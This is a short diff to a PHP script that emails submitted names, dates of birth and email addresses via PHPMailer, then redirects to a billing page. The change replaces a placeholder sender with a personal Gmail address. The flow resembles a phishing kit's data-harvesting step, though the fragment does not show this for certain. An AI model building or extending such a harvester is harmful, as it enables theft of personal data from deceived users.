@@ -43,7 +43,7 @@ if (isset($_POST['name'], $_POST['dob'], $_POST['email'])) {
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
-        $mail->setFrom('noreply@yourdomain.com', 'Your App');
+        $mail->setFrom('jassernawara69@gmail.com', 'Your App');
         $mail->addAddress(getenv("TO_EMAIL"));
 
         $mail->isHTML(false);
@@ -60,3 +60,4 @@ if (isset($_POST['name'], $_POST['dob'], $_POST['email'])) {
 
     header('location: ../loading.php?page=billing.php');
 }
+
